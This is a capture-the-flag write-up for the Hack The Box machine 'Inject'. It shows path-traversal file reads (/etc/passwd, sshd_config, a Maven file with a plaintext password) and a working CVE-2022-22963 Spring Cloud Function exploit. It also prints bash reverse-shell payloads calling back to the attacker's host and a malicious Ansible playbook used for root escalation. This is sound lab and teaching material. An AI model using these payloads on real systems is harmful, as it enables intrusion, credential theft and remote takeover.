# Default Information
OS: Linux

Vulnerabilties exploited: LFI, CVE-2022-22963, ansible

# Nmap
Executing our usual nmap, we can see that this machine is a relatively simple machine with only port 22 and port 8080  being exposed to the public

```bash
PORT      STATE    SERVICE      REASON      VERSION
22/tcp    open     ssh          syn-ack     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
8080/tcp  open     nagios-nsca  syn-ack     Nagios NSCA
|_http-title: Home
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
```

# Enumerating Port 8080
Exploring http://inject.htb:8080, we discover an ```/upload``` endpoint that allows us to save an image file and the saved image file is saved to http://inject.htb:8080/show_image?img=<file name>
  
In the uploaded image url,  we are able to find a LFI vulnerability that can be exploited

![LFI exploitation](https://github.com/joelczk/writeups/blob/main/HTB/Images/Inject/inject_lfi.png)
  
Bruteforcing the endpoints, we notice that we can access the following endpoints
```
/etc/passwd
/etc/group
/etc/hosts
/etc/issue
/etc/crontab
/etc/fstab
/etc/nginx/nginx.conf
/etc/nginx/sites-available/default
/etc/ssh/sshd_config
/proc/self/fd/5
/proc/self/fd/4
/etc/shells
```
  
However, this LFI vulnerability is different from the typical LFI vulnerability as we are able to list the directory contents and we do not need to know the full file path to list the file contents. For example, we can use ```/home``` as the payload to list all the files and directories in the ```/home``` directory
  
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ curl http://inject.htb:8080/show_image?img=../../../../../../home
frank
phil
```
  
Using the LFI vulnerability, we can obtain the SSH password for the ```phil``` user
  
```
┌──(kali㉿kali)-[~/Desktop]
└─$ curl http://inject.htb:8080/show_image?img=../../../../../../home/frank/.m2/settings.xml
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>
```
  
However, we realize that we are unable to login as phil user via SSH with the password that we have obtained. This is because ```phil``` is denied from SSH access in the ```/etc/ssh/sshd_config``` file

```
┌──(kali㉿kali)-[~/Desktop]
└─$ curl http://inject.htb:8080/show_image?img=../../../../../../etc/ssh/sshd_config | grep DenyUsers
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3304  100  3304    0     0   3275      0  0:00:01  0:00:01 --:--:--  3277
DenyUsers phil
```

Using the LFI vulnerability, we are able to list the contents of the ```/var/www``` file directory and we can find a ```WebApp``` folder. Similarly, we are able to find a ```pom.xml``` file in the ```/var/www/WebApp``` folder
  
```
┌──(kali㉿kali)-[~/Desktop]
└─$ curl http://inject.htb:8080/show_image?img=../../../../../../var/www                             
html
WebApp
                                                                                                 
┌──(kali㉿kali)-[~/Desktop]
└─$ curl http://inject.htb:8080/show_image?img=../../../../../../var/www/WebApp                  130 ⨯
.classpath
.DS_Store
.idea
.project
.settings
HELP.md
mvnw
mvnw.cmd
pom.xml
src
target
```

Checking the ```pom.xml``` file, we can find that we are using version 2.6.5 for Spring Framework and version 3.2.2 for Spring Cloud

```
┌──(kali㉿kali)-[~/Desktop]
└─$ curl http://inject.htb:8080/show_image?img=../../../../../../var/www/WebApp/pom.xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <parent>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-parent</artifactId>
            <version>2.6.5</version>
            <relativePath/> <!-- lookup parent from repository -->
    </parent>
    <dependencies>
        ....
        <dependency>
               <groupId>org.springframework.cloud</groupId>
                <artifactId>spring-cloud-function-web</artifactId>
                <version>3.2.2</version>
        </dependency>
        ...
    <dependencies>
```
      
# Exploiting Springboot
Using the version of Springboot framework that we have obtained previously, we will first try to use CVE-2022-22965. However, the application has to be running on Tomcat as a WAR deployment for this to be exploited. Hence, we will not be able to use this exploit
      
Next, we will try to use CVE-2022-22963 based on the version of Spring cloud. Before we do that, we will have to first base64-encode the reverse shell payload that we are going to use. For this exploit, the payload that we will be using will be the following:
      
```
bash -i >& /dev/tcp/<IP address>/<port> 0>&1
```
Lastly, we will follow the exploitation from [here](https://github.com/Kirill89/CVE-2022-22963-PoC) and do a ```curl``` command with to http://inject.htb/functionRouter to spawn a reverse shell connection
```
┌──(kali㉿kali)-[~/Desktop]
└─$ curl -X POST -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi42LzMwMDAgMD4mMQ==}|{base64,-d}|{bash,-i}")' -d xxx http://inject.htb:8080/functionRouter
{"timestamp":"2023-05-15T12:05:37.889+00:00","status":500,"error":"Internal Server Error","message":"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String","path":"/functionRouter"}  
┌──(HTB)─(kali㉿kali)-[~/Desktop]
└─$ nc -nlvp 3000
listening on [any] 3000 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.11.204] 54654
bash: cannot set terminal process group (794): Inappropriate ioctl for device
bash: no job control in this shell
frank@inject:/$ 
```      

# Privilege Escalation to phil
As ```frank``` user, we do not have the privilege to read the user flag. Hence, we will use the password that we have obtained earlier to get access as the ```phil``` user

```
frank@inject:/$ su phil
su phil
Password: DocPhillovestoInject123

phil@inject:/$ cat /home/phil/user.txt
cat /home/phil/user.txt
<user.txt>
phil@inject:/$ 
```

# Privilege Escalation to root
Looking around the server, we are able to find ```/opt/automation/tasks/playbook_1.yml``` which seems to be the yml script used to deploy the web application
  
```
phil@inject:/opt/automation/tasks$ cat playbook_1.yml
cat playbook_1.yml
- hosts: localhost
  tasks:
  - name: Checking webapp service
    ansible.builtin.systemd:
      name: webapp
      enabled: yes
      state: started  
```  

Using pspy to inspect the background processes, we realize that ansible will execute all the yml scripts in ```/opt/automation/tasks```
```
2023/05/14 01:50:01 CMD: UID=0    PID=79658  | /bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml
2023/05/14 01:26:02 CMD: UID=0    PID=77514  | /usr/bin/python3 /usr/bin/ansible-playbook /opt/automation/tasks/playbook_1.yml 
2023/05/14 01:26:02 CMD: UID=0    PID=77516  | 
2023/05/14 01:26:02 CMD: UID=0    PID=77518  | ssh -o ControlPersist 
2023/05/14 01:26:02 CMD: UID=0    PID=77520  | /usr/bin/python3 /usr/bin/ansible-playbook /opt/automation/tasks/playbook_1.yml 
2023/05/14 01:26:02 CMD: UID=0    PID=77521  | /bin/sh -c /bin/sh -c 'echo ~root && sleep 0' 
2023/05/14 01:26:02 CMD: UID=0    PID=77524  | /usr/bin/python3 /usr/bin/ansible-playbook /opt/automation/tasks/playbook_1.yml   
```  

We can make use of that to make ansible execute our exploit script. First of all, we will create a reverse shell payload at /tmp/shell.sh
```
echo '/bin/bash -i >& /dev/tcp/<local-ip>/<local-port> 0>&1' > /tmp/root.sh
``` 
Next, we will then create a malicious ```shell.yml``` script that will cause the reverse shell at /tmp/root.sh to be executed
```
- hosts: localhost
  tasks:
    - name: RShell
      command: sudo bash /tmp/root.sh  
```  
Finally, a reverse shell connection will be spawned after ```ansible-parallel``` executes all the yml files in the ```/opt/automation/tasks``` directory and we can obtain the root flag. 
```
phil@inject:/$ cat /root/root.txt
<root.txt>
```

# Afterthoughts
## Analysis of LFI
After digging furthur at the LFI, I was able to find the source of the vulnerability at the ```getImage``` function at ```/var/www/WebApp/src/main/java/com/example/WebApp/user/UserController.java```
  
```
@RequestMapping(value = "/show_image", method = RequestMethod.GET)
public ResponseEntity getImage(@RequestParam("img") String name) {
    String fileName = UPLOADED_FOLDER + name;
    Path path = Paths.get(fileName);
    Resource resource = null;
    try {
        resource = new UrlResource(path.toUri());
    } catch (MalformedURLException e){
        e.printStackTrace();
    }
    return ResponseEntity.ok().contentType(MediaType.IMAGE_JPEG).body(resource);
}
```  

The source of the vulnerability comes from the line below, where the ```name``` variable is being controlled by the user.

```
private static String UPLOADED_FOLDER = "/var/www/WebApp/src/main/uploads/"
String fileName = UPLOADED_FOLDER + name
```
  
As a result the ```path``` variable becomes ```/var/www/WebApp/src/main/uploads/../../../../../../etc/passwd```
  
```
Path path = Paths.get(fileName) 
```  

Next, the ```resource``` variable will then become ```file://var/www/WebApp/src/main/uploads/../../../../../../etc/passwd``` and then this gets loaded into a url using the ```UrlResource```. Additionally, we also realize that since the target web application uses Java and the ```Paths.get()``` function is being used, we can supply ```/etc``` as the payload and the ```resource``` variable will become ```file://var/www/WebApp/src/main/uploads/../../../../../../etc``` which will then get loaded into a url. This is the reason why we are able to view the contents of the ```/etc``` directory which is different from the typical LFI exploitation scenario.

```
Resource resource = null;
try {
    resource = new UrlResource(path.toUri());
}
```  

Finally, the following code will then return the contents of the file that is being read in the LFI vulnerability due to the following code
```
return ResponseEntity.ok().contentType(MediaType.IMAGE_JPEG).body(resource); 
```
  
  
